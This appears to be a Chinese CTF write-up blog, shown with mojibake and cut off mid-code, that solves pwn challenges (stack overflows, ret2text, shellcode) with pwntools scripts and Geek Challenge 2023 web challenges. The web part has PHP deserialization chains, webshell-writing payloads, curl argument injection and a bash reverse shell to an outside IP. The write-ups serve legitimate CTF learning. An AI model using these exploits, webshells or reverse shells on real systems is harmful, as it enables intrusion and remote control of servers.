#\rå…ˆæ”¾åˆ°è™šæ‹Ÿæœºé‡Œchecksecä¸€ä¸‹ï¼Œèƒ½çœ‹åˆ°å¼€å¯NXï¼Œæ²¡æœ‰PIEï¼Œ64ä½\næ”¾è¿›64ä½çš„IDAåç¼–è¯‘ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°åœ¨giftå‡½æ•°é‡Œç•™äº†åé—¨\nç„¶åå†vulnå‡½æ•°é‡Œæœ‰readå‡½æ•°ï¼Œå­˜åœ¨æº¢å‡º\nret2textçš„åŸºæœ¬åšæ³•å°±æ˜¯è®©è¯»å…¥çš„bufæº¢å‡ºåˆ°system/bin/shçš„åœ°å€\nè¿™é‡Œå¯¹äºbufçš„é•¿åº¦ï¼Œæœ‰ä¸¤ç§åˆ¤æ–­æ–¹å¼ï¼Œè¦ä¹ˆç›´æ¥çœ‹IDAåç¼–è¯‘çš„ç»“æœï¼ˆè¿™ä¸ªæœ‰å¯èƒ½ä¸å‡†ï¼‰ï¼Œè¦ä¹ˆå°±è¿›å…¥åŠ¨æ€è°ƒè¯•æŸ¥çœ‹\nè¿™é‡Œå…ˆå°†readå‡½æ•°çš„åœ°å€å¤åˆ¶ä¸‹æ¥åœ¨è™šæ‹Ÿæœºçš„pwndbgé‡Œè¿›è¡Œæ–­ç‚¹è°ƒè¯•\nè®¡ç®—RAXå’ŒRBPçš„å·®å€¼ï¼Œå³ä¸ºæ•°ç»„çš„å®é™…é•¿åº¦\nprint(0x7fffffffe380-0x7fffffffe370)\r#16 é‚£ä¹ˆret2textçš„åŸºæœ¬æ¡†æ¶å°±æ˜¯è¿™æ ·ğŸ‘‡\nfrom pwn import *\rio = remote(\u0026#39;node4.anna.nssctf.cn\u0026#39;,28980)\rtarget=0x00000000004005C4 #system/bin/shçš„åœ°å€\rpayload=b\u0026#39;a\u0026#39;*(16+8)+p64(target) #æ ˆæº¢å‡º\r#å¦‚æœæ˜¯32ä½æŒ‡é’ˆå¤§å°å°±æ˜¯4ï¼Œå¦‚æœæ˜¯64ä½æŒ‡é’ˆå¤§å°å°±æ˜¯8\rio.send(payload)\rio.interactive() [BJDCTF 2020]babystack2.0 #\rå…ˆcheckä¸€ä¸‹ï¼Œç”¨IDA64ä½æ‰“å¼€\nå…ˆçœ‹mainå‡½æ•°æºç \nå¯ä»¥å¾—å‡ºï¼Œå…ˆè¦è¾“åå­—çš„é•¿åº¦ï¼Œç„¶åå†readï¼Œbufæ˜¯12ä½ï¼Œä¹Ÿå¯ä»¥è¿›è¡Œè°ƒè¯•ç®—ï¼ˆæˆ‘è¿™é¢˜è°ƒä¸å‡ºæ¥ï¼Œå¯ä»¥ç›´æ¥ç”¨IDAç»™çš„æ•°æ®\nç”±äºæœ‰ä¸¤ä¸ªè¾“å…¥ç‚¹ï¼Œä¸€ä¸ªæ˜¯scanfï¼Œå¦ä¸€ä¸ªæ˜¯readï¼Œscanfè¿™ä¸ªç‚¹å¯ä»¥éšä¾¿å¡«ï¼Œé‡ç‚¹åœ¨äºreadéƒ¨åˆ†çš„æº¢å‡º\nbufçš„æ•°ç»„é•¿åº¦åº”è¯¥æ˜¯ç”±æ³¨é‡Šéƒ¨åˆ†æ¥è®¡ç®—å¾—åˆ°0x10\né‚£ä¹ˆè¿˜æ˜¯å¥—åŸºæœ¬æ¡†æ¶å†™è„šæœ¬\nfrom pwn import *\rio = remote(\u0026#39;node4.anna.nssctf.cn\u0026#39;,28559)\rtarget=0x040072A #system/bin/shçš„åœ°å€\rpayload=b\u0026#39;a\u0026#39;*(24)+p64(target) #æ ˆæº¢å‡º\rio.sendlineafter(\u0026#39;name:\u0026#39;,b\u0026#39;-1\u0026#39;)\rio.sendafter(\u0026#39;name?\u0026#39;,payload)\rio.interactive() å¯¹äºreadå‡½æ•°æ¥è¯´æ˜¯ä¸éœ€è¦ç”¨sendlineçš„ï¼Œsendlineä¼šåœ¨æœ«å°¾åŠ ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œä¹Ÿå°±æ˜¯å›è½¦ï¼Œscanfæ˜¯å¿…é¡»è¦å›è½¦ç»“å°¾çš„ã€‚\n[NISACTF 2022]ezstack #\rç”¨32ä½IDAæ‰“å¼€\nå¯ä»¥çœ‹åˆ°åœ¨shellå‡½æ•°é‡Œå­˜åœ¨æº¢å‡º\nè¿™é‡Œæ²¡æœ‰ç›´æ¥å¯ä»¥ä½¿ç”¨æ˜¯system/bin/sh\nä¸è¿‡ç»è¿‡æŸ¥æ‰¾åœ¨pltè¿æ¥è¡¨æ®µé‡Œæœ‰systemçš„åœ°å€ï¼Œåœ¨dataæ®µé‡Œæœ‰/bin/shçš„å­—ç¬¦ä¸²å¯ä»¥å‡‘æˆå‘½ä»¤\nè¿™é“é¢˜æœ‰ç‚¹libcçš„æ„Ÿè§‰\nå…ˆæº¢å‡ºï¼Œç„¶ååˆ°systemçš„è¿æ¥åœ°å€ï¼Œç„¶åè¡¥å……4ä¸ªå•ä½çš„åƒåœ¾æ•°æ®ï¼Œæœ€åæ˜¯/bin/shçš„å‘½ä»¤å­—ç¬¦ä¸²\nå½“ç¨‹åºè°ƒç”¨systemå‡½æ•°æ—¶ï¼Œä¼šè‡ªåŠ¨å»å¯»æ‰¾æ ˆåº•å³ebpæŒ‡å‘çš„ä½ç½®ï¼Œç„¶åå°†ebp+8å­—èŠ‚çš„ä½ç½®çš„æ•°æ®å½“ä½œå‡½æ•°çš„å‚æ•°ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³å°†/bin/shä½œä¸ºsystemå‡½æ•°çš„å‚æ•°ï¼Œå°±å¯ä»¥åœ¨æ ˆæº¢å‡ºçš„æ—¶å€™ï¼Œå…ˆä¿®æ”¹eipä¸ºsystemå‡½æ•°çš„åœ°å€ï¼Œç„¶åå¡«å……4ä¸ªå­—èŠ‚çš„åƒåœ¾æ•°æ®ï¼Œå†å°†/bin/shçš„åœ°å€å†™å…¥æ ˆä¸Šï¼Œè¿™æ ·è°ƒç”¨systemå‡½æ•°çš„æ—¶å€™ï¼Œå°±å¯ä»¥å°†/bin/shä½œä¸ºå‚æ•°ï¼Œç„¶åè¿”å›ä¸€ä¸ªshellã€‚(è¿™æ˜¯ä¸ºä»€ä¹ˆè¦åœ¨systemaddråé¢è¡¥4ä¸ªå­—èŠ‚çš„åŸå› \nå…·ä½“å¯æŸ¥ï¼šPWNç–‘éš¾ï¼ˆ1-3ï¼‰-å…³äºpayloadä¸­æ ˆçš„å¸ƒç½®ä»¥åŠsystemçš„ä¸€äº›å›°æƒ‘ (yuque.com)\nfrom pwn import *\rio = remote(\u0026#39;node5.anna.nssctf.cn\u0026#39;,28088)\rsystem_addr=0x08048390\rbinsh_addr=0x0804A024\rpayload=b\u0026#39;a\u0026#39;*(0x48+4)+p32(system_addr)+b\u0026#39;a\u0026#39;*4+p32(binsh_addr)\rio.send(payload)\rio.interactive() [NISACTF 2022]ezpie #\rå…ˆchecksecï¼Œ32ä½ï¼Œå¼€å¯äº†pieä¿æŠ¤ï¼Œè¿™å°±é€ æˆäº†åœ°å€çš„éšæœºåŒ–ï¼Œä½†æ˜¯åœ°å€çš„ç›¸å¯¹ä½ç§»çš„ä¸å˜çš„\nä½¿ç”¨readelfå·¥å…·æŸ¥çœ‹åœ°å€\nå¯ä»¥çœ‹åˆ°mainå‡½æ•°å’Œshellå‡½æ•°çš„åœ°å€\né‚£ä¹ˆå¯ä»¥è¿™æ ·å†™è„šæœ¬ğŸ‘‡\nfrom pwn import *\rio = remote(\u0026#39;node5.anna.nssctf.cn\u0026#39;,28902)\rmain_addr=0x00000770\rshell_addr=0x0000080f\roffset=shell_addr-main_addr #è®¡ç®—åç§»é‡\rmain_real_addr=int(io.recvuntil(\u0026#39;70\u0026#39;)[-10:].decode(),16)#æ ¹æ®IDAæºç å¯çŸ¥\rshell_real_addr=main_real_addr+offset #æ‹¼æ¥å‡ºçœŸå®çš„shellåœ°å€\rpayload=b\u0026#39;a\u0026#39;*(0x28+4)+p32(shell_real_addr) #æº¢å‡ºå³å¯\rio.send(payload)\rio.interactive() æå®¢å¤§æŒ‘æˆ˜2023 ret2text #\rå¯ä»¥çœ‹åˆ°å¼€å¯äº†PIEä¿æŠ¤ï¼Œå¯¼è‡´åœ°å€éšæœºåŒ–\nåœ¨backdooré‡Œå‘ç°åé—¨å‡½æ•°\nç”±äºPIEç‰¹æ€§ï¼Œåªæœ‰æœ€åä¸¤ä¸ªå­—èŠ‚ä¼šä¸åŒï¼Œåªéœ€è¦è¦†ç›–æœ€åä¸¤ä¸ªå­—èŠ‚åˆ°backdoorå³å¯ï¼Œåˆå› ä¸ºåœ°å€æ˜¯éšæœºåŒ–çš„ï¼Œåªèƒ½æ¦‚ç‡æ€§è·å¾—shell\nè„šæœ¬å¦‚ä¸‹ğŸ‘‡\nfrom pwn import *\rio=process(\u0026#34;./ret2text\u0026#34;)\rbackdoor=0x1227 #åé—¨åœ°å€\rpayload=b\u0026#39;a\u0026#39;*88+p16(backdoor) #åªéœ€è¦è¦†ç›–ä¸¤ä¸ªå­—èŠ‚å³å¯\rwhile True:\rio.send(payload)\rio.interactive() ret2shellcode #\r[HNCTF 2022 Week1]ret2shellcode #\rå…ˆè¿›è¡Œcheck\nåœ¨IDAä¸­çœ‹åˆ°mainå‡½æ•°\næºç ä¸­å¹¶ä¸å­˜åœ¨/bin/shçš„åœ°å€ï¼Œä¸è¿‡buffå¤„äºbssæ®µæ˜¯å¯å†™çš„\nåœ¨readå‡½æ•°çš„calléƒ¨åˆ†æ‰“ä¸ªæ–­ç‚¹ï¼Œç”¨vmmapæŸ¥çœ‹\nå‘ç°åœ°å€ä¸º0x404000åˆ°0x405000çš„åœ°å€æ®µæ˜¯å¯è¯»å†™å¯æ‰§è¡Œçš„\né‚£ä¹ˆå°±è¦å°è¯•å‘é€shellcodeåˆ°buffæ®µï¼Œç„¶åæº¢å‡ºåˆ°buffçš„åœ°å€ï¼ˆå°±è¿™é“é¢˜è€Œè¨€\nç¼–å†™è„šæœ¬ğŸ‘‡\nfrom pwn import *\rcontext(log_level = \u0026#34;debug\u0026#34;, arch = \u0026#39;amd64\u0026#39;)\rio=remote(\u0026#39;node5.anna.nssctf.cn\u0026#39;, 28167)\rbuff_addr = 0x4040A0\rshellcode = asm(shellcraft.sh())\rpayload = shellcode.ljust(0x100+8, b\u0026#39;a\u0026#39;) + p64(buff_addr)\rio.sendline(payload)\rio.interactive() å…¶ä¸­ä½¿ç”¨äº†ç³»ç»Ÿè‡ªå¸¦çš„shellcraftï¼Œä¸€å®šè¦è®¾ç½®contextï¼Œä¸ç„¶å°±ä¼šæ— å›æ˜¾æˆ–è€…æŠ¥é”™ï¼Œå»ºè®®ç±»ä¼¼çš„shellcodeéƒ½è¦åŠ context\n[HNCTF 2022 Week1]ezr0p32 #\rcheckä¸€ä¸‹\nä¸»è¦çš„å‡½æ•°å†…å®¹\nç»è¿‡ç®€å•åˆ†æï¼Œå¯ä»¥çœ‹åˆ°pltæ®µå­˜æœ‰systemçš„åœ°å€ï¼Œ\nè€Œä¸”åœ¨bssæ®µä¹Ÿæœ‰å¯å†™å…¥çš„bufåŒºé—´\nè¿™é“é¢˜çš„æ­¥éª¤å°±æ˜¯åœ¨ç¬¬ä¸€ä¸ªreadå‡½æ•°å¤„å†™å…¥/bin/shï¼Œç„¶ååœ¨ç¬¬äºŒä¸ªreadè¯»å–æ˜¯æ—¶å€™æº¢å‡ºåˆ°pltçš„systemåœ°å€ï¼Œç„¶åæ‹¿åˆ°shell\nç¼–å†™è„šæœ¬ğŸ‘‡\nfrom pwn import *\rio=remote(\u0026#39;node5.anna.nssctf.cn\u0026#39;,28772)\rsystem_addr=0x080483D0\rbss_addr=0x804a080\rpayload=\u0026#39;/bin/sh\u0026#39;\rio.sendafter(\u0026#39;please tell me your name\\n\u0026#39;,payload)\rpayload=b\u0026#39;a\u0026#39;*(28+4)+p32(system_addr)+p32(0)+p32(bss_addr)\rio.sendafter(\u0026#34;now it\u0026#39;s your play time~\\n\u0026#34;,payload)\rio.interactive() [HNCTF 2022 Week1]safe_shellcode #\ræºç æ˜¯è¿™æ ·çš„ğŸ‘‡\nå…¶ä¸­å¯¹è¾“å…¥çš„sæœ‰asciiå€¼çš„åˆ¤æ–­ï¼Œå¤§æ¦‚å°±æ˜¯å¿…é¡»æ˜¯å¯è§å­—ç¬¦ï¼Œä¸ç„¶å°±exit\nç„¶åæŠŠsæ¨åˆ°buffé‡Œï¼Œæ‰§è¡Œbuff\nç¼–å†™è„šæœ¬ğŸ‘‡\nfrom pwn import *\rio=remote(\u0026#39;node5.anna.nssctf.cn\u0026#39;,28428)\rcontext(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;)\rshellcode=\u0026#39;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00gao@fossa\u0026#39;\rio.send(shellcode)\rio.interactive() ","date":"2023-12-05","externalUrl":null,"permalink":"/posts/2023/12/pwn-practice/","section":"Posts","summary":"","title":"Pwnç»ƒä¹ é¢˜","type":"posts"},{"content":"\rå‰è¨€ #\ræœ¬æ ¡çš„æå®¢å¤§æŒ‘æˆ˜è¿˜æ˜¯è¦å‚åŠ çš„ï¼Œå»å¹´å°±å¾ˆé—æ†¾ï¼Œä»Šå¹´å¾—å¥½å¥½æ‰“ä¸€ä¸‹ï¼Œè¿™æ¬¡æˆ‘ä¼šæŠŠèƒ½å†™çš„å…¨å†™åœ¨åšå®¢é‡Œï¼ŒåŒæ—¶ä¹Ÿä¼šå­¦ä¹ ä¸€ä¸‹å…¶ä»–çš„æ–¹å‘\nç»„é˜Ÿçš„é˜Ÿå‹æ˜¯å¤–æ ¡å¤§ä¸‰çš„ç½‘å·¥å­¦é•¿ï¼Œå¾ˆå¼ºçš„é€‰æ‰‹ï¼\né¢˜ç›®æ²¡æœ‰åˆ†weekï¼Œè¿™é‡Œæˆ‘å°±åˆ†ç±»ï¼ŒæŒ‰ç…§æ—¶é—´é¢˜ç›®å‘å¸ƒæ—¶é—´/åšå‡ºæ¥çš„é¡ºåºæ¥å†™äº†\nä»¥æ ¡å¤–èµ›é“21åçš„æˆç»©ç»“æŸæ¯”èµ›ï¼Œå­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼\nWEB #\rEzHttp #\rhttpç­¾åˆ°ï¼Œç‚¹å‡»å°±é€flag http://1.117.175.65:23333/\nç¬¬ä¸€å…³ï¼šè¯·postä¼ å‚usernameå’Œpasswordè¿›è¡Œç™»å½•\nè´¦å·å¯†ç åœ¨\nç¬¬äºŒå…³ï¼šå¿…é¡»æ¥æºè‡ªsycsec.com ğŸ‘‰æ·»åŠ refererå¤´\nç¬¬ä¸‰å…³ï¼šè¯·ä½¿ç”¨Sycloveræµè§ˆå™¨ ğŸ‘‰ä¿®æ”¹user-agentå¤´\nç¬¬å››å…³ï¼šè¯·ä»localhostè®¿é—® ğŸ‘‰ç»å…¸çš„XFFå¤´ç»•è¿‡\nç¬¬äº”å…³ï¼šè¯·ä½¿ç”¨Syc.vipä»£ç† ğŸ‘‰æ·»åŠ Viaå¤´\nç„¶åè·³è½¬åˆ°ä¸€ä¸ªé¡µé¢\n\u0026lt;?php\rif($_SERVER[\u0026#39;HTTP_O2TAKUXX\u0026#39;]==\u0026#34;GiveMeFlag\u0026#34;){\recho $flag;\r}\r?\u0026gt; è¿™æ®µä»£ç çš„æ„æ€æ˜¯åˆè¦ä¸€ä¸ªhttpå¤´åä¸ºO2TAKUXXï¼Œå€¼ä¸ºGiveMeFlag\næœ€ç»ˆå¦‚å›¾ğŸ‘‡\nunsign #\rä¸€é“ååºåˆ—åŒ–é¢˜ï¼Œä»£ç å¦‚ä¸‹\n\u0026lt;?php\rhighlight_file(__FILE__);\rclass syc\r{\rpublic $cuit;\rpublic function __destruct()\r{\recho(\u0026#34;action!\u0026lt;br\u0026gt;\u0026#34;);\r$function=$this-\u0026gt;cuit;\rreturn $function();\r}\r}\rclass lover\r{\rpublic $yxx;\rpublic $QW;\rpublic function __invoke()\r{\recho(\u0026#34;invoke!\u0026lt;br\u0026gt;\u0026#34;);\rreturn $this-\u0026gt;yxx-\u0026gt;QW;\r}\r}\rclass web\r{\rpublic $eva1;\rpublic $interesting;\rpublic function __get($var)\r{\recho(\u0026#34;get!\u0026lt;br\u0026gt;\u0026#34;);\r$eva1=$this-\u0026gt;eva1;\r$eva1($this-\u0026gt;interesting);\r}\r}\rif (isset($_POST[\u0026#39;url\u0026#39;])) {\runserialize($_POST[\u0026#39;url\u0026#39;]);\r}\r?\u0026gt; popé“¾ä»ä¸Šå¾€ä¸‹å¾ˆæ˜æ˜¾äº†ï¼šdestructğŸ‘‰invokeğŸ‘‰get\n\u0026lt;?\rclass syc\r{\rpublic $cuit;\r}\rclass lover\r{\rpublic $yxx;\rpublic $QW;\r}\rclass web\r{\rpublic $eva1=\u0026#39;system\u0026#39;;\rpublic $interesting=\u0026#39;cat /f*\u0026#39;;\r}\r$syc=new syc();\r$lover=new lover();\r$web=new web();\r$syc-\u0026gt;cuit=$lover;\r$lover-\u0026gt;yxx=$web;\recho serialize($syc);\r#O:3:\u0026#34;syc\u0026#34;:1:{s:4:\u0026#34;cuit\u0026#34;;O:5:\u0026#34;lover\u0026#34;:2:{s:3:\u0026#34;yxx\u0026#34;;O:3:\u0026#34;web\u0026#34;:2:{s:4:\u0026#34;eva1\u0026#34;;s:6:\u0026#34;system\u0026#34;;s:11:\u0026#34;interesting\u0026#34;;s:7:\u0026#34;cat /f*\u0026#34;;}s:2:\u0026#34;QW\u0026#34;;N;}} n00b_Upload #\ræ¯”è¾ƒç®€å•çš„æ–‡ä»¶ä¸Šä¼ ï¼Œç›´æ¥ä¸Šå›¾ğŸ‘‡\nåœ¨å³è¾¹æœ‰å¯¹åº”çš„æ£€æµ‹é¡¹ï¼Œæˆ‘è¿™é‡Œæ˜¯å‰é¢åŠ äº†éƒ¨åˆ†å›¾ç‰‡çš„å†…å®¹ï¼Œæœ«å°¾åŠ äº†phpçš„çŸ­ä»£ç ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨phpä¼šè¢«æ£€æµ‹åˆ°ï¼Œæ–‡ä»¶ç±»å‹ä¹Ÿè¦æ”¹ï¼Œç„¶åå°±èƒ½å‘½ä»¤æ‰§è¡Œäº†\neasy_php #\rå­¦äº†phpäº†ï¼Œé‚£å°±æ¥çœ‹çœ‹è¿™äº›ç»•è¿‡å§\n\u0026lt;?php\rheader(\u0026#39;Content-type:text/html;charset=utf-8\u0026#39;);\rerror_reporting(0);\rhighlight_file(__FILE__);\rinclude_once(\u0026#39;flag.php\u0026#39;);\rif(isset($_GET[\u0026#39;syc\u0026#39;])\u0026amp;\u0026amp;preg_match(\u0026#39;/^Welcome to GEEK 2023!$/i\u0026#39;, $_GET[\u0026#39;syc\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;syc\u0026#39;] !== \u0026#39;Welcome to GEEK 2023!\u0026#39;) {\rif (intval($_GET[\u0026#39;lover\u0026#39;]) \u0026lt; 2023 \u0026amp;\u0026amp; intval($_GET[\u0026#39;lover\u0026#39;] + 1) \u0026gt; 2024) {\rif (isset($_POST[\u0026#39;qw\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;yxx\u0026#39;]) {\r$array1 = (string)$_POST[\u0026#39;qw\u0026#39;];\r$array2 = (string)$_POST[\u0026#39;yxx\u0026#39;];\rif (sha1($array1) === sha1($array2)) {\rif (isset($_POST[\u0026#39;SYC_GEEK.2023\u0026#39;])\u0026amp;\u0026amp;($_POST[\u0026#39;SYC_GEEK.2023\u0026#39;]=\u0026#34;Happy to see you!\u0026#34;)) {\recho $flag;\r} else {\recho \u0026#34;å†ç»•æœ€åä¸€æ­¥å§\u0026#34;;\r}\r} else {\recho \u0026#34;å¥½å“©ï¼Œå¿«æ‹¿åˆ°flagå•¦\u0026#34;;\r}\r} else {\recho \u0026#34;è¿™é‡Œç»•ä¸è¿‡å»ï¼ŒQWå¯ä¸ç­”åº”äº†å“ˆ\u0026#34;;\r}\r} else {\recho \u0026#34;å˜¿å˜¿å˜¿ï¼Œä½ åˆ«æ€¥å•Š\u0026#34;;\r}\r}else {\recho \u0026#34;ä¸ä¼šå§ä¸ä¼šå§ï¼Œä¸ä¼šç¬¬ä¸€æ­¥å°±å¡ä½äº†å§ï¼Œyxxä¼šç§ä¸èµ·ä½ çš„ï¼\u0026#34;;\r}\r?\u0026gt; ç¬¬ä¸€å±‚ï¼šæ­£åˆ™åŒ¹é…ï¼Œè¿™é‡Œçš„preg_matchå‡½æ•°é‡‡ç”¨çš„åŒ¹é…æ–¹å¼æ˜¯ä»å¤´åˆ°å°¾/^abc$/è¿™æ ·çš„å½¢å¼ï¼Œåªéœ€è¦åœ¨å­—ç¬¦ä¸²çš„æœ€åæ·»åŠ %0aæ¢è¡Œç¬¦å³å¯ç»•è¿‡\nç¬¬äºŒå±‚ï¼šintvalï¼Œç§‘å­¦è®¡æ•°æ³•å³å¯ç»•è¿‡ï¼Œ2022e2\nç¬¬ä¸‰å±‚ï¼šstringåŒ–çš„sha1æ¯”è¾ƒï¼Œè¿™é‡Œåªéœ€æŠŠå‚æ•°éƒ½ä»¥æ•°ç»„å½¢å¼ä¼ è¿›å»ï¼Œç»è¿‡stringå¼ºè½¬åå€¼éƒ½å˜æˆäº†Array\nç¬¬å››å±‚ï¼šSYC_GEEK.2023è¿™ä¸ªå­—ç¬¦ä¸²å­˜åœ¨ä¸€ä¸ªä¸‹åˆ’çº¿ï¼Œè€Œä¸‹åˆ’çº¿è¢«å½“ä½œå‚æ•°ä¼ è¿›å»åä¼šè¢«PHPè½¬ä¸ºä¸€ä¸ªç‚¹ï¼Œä¸è¿‡å½“å·¦æ‹¬å· [ è¢«å½“ä½œå‚æ•°ä¼ å…¥çš„æ—¶å€™ï¼Œä¼šè¢«è½¬ä¸ºä¸‹åˆ’çº¿ï¼Œè¿™é‡Œåªéœ€è¦ä¿®æ”¹å…¶ä¸­çš„ä¸‹åˆ’çº¿ä¸ºå·¦æ‹¬å·å³å¯ã€‚å½“å‰å‰é¢å·²ç»æœ‰PHPç‰¹æ®Šå­—ç¬¦è½¬æ¢çš„æ—¶å€™ï¼Œåç»­çš„å°±ä¼šè¢«å¿½ç•¥ï¼ŒGEEKå’Œ2023çš„ä¸­çš„ç‚¹å°±ä¸ç”¨ç®¡äº†\nctf_curl #\rå‘½ä»¤æ‰§è¡Œï¼ŸçœŸçš„å—ï¼Ÿ\n\u0026lt;?php\rhighlight_file(\u0026#39;index.php\u0026#39;);\r// curl your domain\r// flag is in /tmp/Syclover\rif (isset($_GET[\u0026#39;addr\u0026#39;])) {\r$address = $_GET[\u0026#39;addr\u0026#39;];\rif(!preg_match(\u0026#34;/;|f|:|\\||\\\u0026amp;|!|\u0026gt;|\u0026lt;|`|\\(|{|\\?|\\n|\\r/i\u0026#34;, $address)){\r$result = system(\u0026#34;curl \u0026#34;.$address.\u0026#34;\u0026gt; /dev/null\u0026#34;);\r} else {\recho \u0026#34;Hacker!!!\u0026#34;;\r}\r}\r?\u0026gt; æºç ä¸­ç»™äº†æç¤ºäº†ï¼Œcurlä½ çš„åŸŸåï¼Œè¿™é“é¢˜éœ€è¦ä¸€ä¸ªæœåŠ¡å™¨ï¼Œç„¶åå†æœåŠ¡å™¨ä¸‹å†™ä¸€ä¸ªphpæ–‡ä»¶ï¼Œç„¶ååœ¨é¢˜ç›®ä¸­curlè‡ªå·±æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶ï¼Œä½¿ç”¨-o å‚æ•°è¾“å‡ºåˆ°é¢˜ç›®é¶æœºçš„ç›®å½•ä¸‹ï¼Œç„¶åè·³è½¬åˆ°å…¶ç•Œé¢å³å¯è¿æ¥èšå‰‘æˆ–è€…ç›´æ¥æ‰‹æ‰“\nklf_ssti #\ré¡µé¢æºç ä¸­ç»™äº†ä¸€ä¸ª/hackè·¯ç”±ï¼Œklfæ˜¯å‚æ•°ï¼Œä½†åˆæ­¥æµ‹è¯•æ²¡æœ‰æ•ˆæœ\nè¿™é‡Œæ¨èä¸€ä¸ªSSTImapå·¥å…·ï¼Œååˆ†å¼ºå¤§ï¼Œè¿˜èƒ½ç›´æ¥æ¨¡æ‹Ÿshellè¿æ¥\nGitHub - vladko312/SSTImap: Automatic SSTI detection tool with interactive interface\nD:\\SSTImap-master\u0026gt;python sstimap.py -u http://c6wgxl35yii5gu40b1oi0ob46.node.game.sycsec.com/hack?klf=1 --os-shell æ£€æµ‹å‡ºæ¥æ˜¯ç›²æ³¨ï¼Œååº”éƒ½ä¼šå¾ˆæ…¢ï¼Œè¿™é‡Œå¯ä»¥æŠŠshellåå¼¹åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Š\nbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/101.35.19.78/100 0\u0026gt;\u0026amp;1\u0026#34; å†æ¬¡è¯æ˜äº†ç§‘æŠ€çš„é‡è¦æ€§ğŸ˜‚\nez_remove #\r\u0026lt;?php\rhighlight_file(__FILE__);\rclass syc{\rpublic $lover;\rpublic function __destruct()\r{\reval($this-\u0026gt;lover);\r}\r}\rif(isset($_GET[\u0026#39;web\u0026#39;])){\rif(!preg_match(\u0026#39;/lover/i\u0026#39;,$_GET[\u0026#39;web\u0026#39;])){\r$a=unserialize($_GET[\u0026#39;web\u0026#39;]);\rthrow new Error(\u0026#34;å¿«æ¥ç©å¿«æ¥ç©~\u0026#34;);\r}\relse{\recho(\u0026#34;nonono\u0026#34;);\r}\r}\r?\u0026gt; ä¸¤ä¸ªè€ƒç‚¹\nå…¶ä¸€ï¼šè¿™ä¸ªpreg_matchæ­£åˆ™åŒ¹é…åœ¨è¿™æ ·çš„æ¨¡å¼ä¸‹ï¼Œæ˜¯ä¸å­˜åœ¨æ¼æ´çš„ï¼Œä¹Ÿå°±æ— æ³•ä½¿ç”¨ä¸Šé¢é‚£é“é¢˜è¯´è¿‡çš„æ¢è¡Œç¬¦ç»•è¿‡ï¼Œå¹¶ä¸”ç”±äºåºåˆ—åŒ–å­—ç¬¦ä¸²çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½ä¿®æ”¹å­—ç¬¦ä¸²çš„å€¼ï¼Œä½†æ˜¯å¯ä»¥æ”¹å˜å…¶è¿›åˆ¶ï¼Œå½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„så±æ€§ä¸ºå¤§å†™æ—¶å€™ï¼Œå°±èƒ½å¤Ÿè¯†åˆ«åé¢å­—ç¬¦ä¸²ä¸­çš„åå…­è¿›åˆ¶å­—ç¬¦\nå…¶äºŒï¼šthrowå‡ºçš„Errorä¼šæ‰“æ–­æ­£å¸¸çš„ååºåˆ—åŒ–ï¼Œä»è€Œæ— æ³•destructï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡PHPçš„GCåƒåœ¾å›æ”¶æœºåˆ¶ç»•è¿‡\nè´´ä¸€ä¸‹æ–‡ç« ï¼šæµ…æPHP GCåƒåœ¾å›æ”¶æœºåˆ¶åŠå¸¸è§åˆ©ç”¨æ–¹å¼ï¼ˆä¸€ï¼‰-é˜¿é‡Œäº‘å¼€å‘è€…ç¤¾åŒº (aliyun.com)\nä¸Šé¢å¯ä»¥çœ‹åˆ°èƒ½å¤Ÿè¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„å‘½ä»¤éƒ½è¢«banäº†ï¼Œç”¨ä¸äº†\nè¿™é‡Œå¯ä»¥ä½¿ç”¨phpçš„file_put_contentå‡½æ•°ï¼Œå†™å…¥ä¸€ä¸ªphpæœ¨é©¬\n\u0026lt;?php\rclass syc{\rpublic $lover=\u0026#34;file_put_contents(\u0026#39;shell.php\u0026#39;, \u0026#39;\u0026lt;?php eval(\\$_POST[a])?\u0026gt;\u0026#39;);\u0026#34;;\rpublic function __destruct()\r{\reval($this-\u0026gt;lover);\r}\r}\r$a=new syc();\r$s=serialize(array($a,0));\recho serialize(array($a,0));\recho PHP_EOL;\rpreg_replace(\u0026#39;lover\u0026#39;,\u0026#39;\\\\6cover\u0026#39;,$s);\recho $s;\r#å†è‡ªå·±ä¿®æ”¹ä¸€ä¸‹\r#a:2:{i:0;O:3:\u0026#34;syc\u0026#34;:1:{S:5:\u0026#34;\\6cover\u0026#34;;s:58:\u0026#34;file_put_contents(\u0026#39;shell.php\u0026#39;, \u0026#39;\u0026lt;?php eval($_POST[a])?\u0026gt;\u0026#39;);\u0026#34;;}i:0;i:0;} ç”±äºåˆšæ‰è¯´è¿‡ï¼Œè¢«banäº†ï¼Œè¿™é‡Œåªèƒ½ä¸Šèšå‰‘æ¥æ‰¾äº†\næ ¹ç›®å½•ä¸‹æ‰“å¼€çœ‹ä¸è§ï¼Œå¹¶ä¸ä»£è¡¨ä»–æ²¡æœ‰å“¦\nez_path #\ré¢˜ç›®æºç ç»™äº†æç¤º\npycåç¼–è¯‘åçœ‹åˆ°çš„éƒ¨åˆ†ä»£ç ğŸ‘‡\n# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information\r# Version : Python 3.6\rimport os\rimport uuid\rfrom flask import Flask, render_template, request, redirect\rapp = Flask(__name__)\rARTICLES_FOLDER = \u0026#39;articles/\u0026#39;\rarticles = []\rclass Article:\rdef __init__(self, article_id, title, content):\rself.article_id = article_id\rself.title = title\rself.content = content\rdef generate_article_id():\rreturn 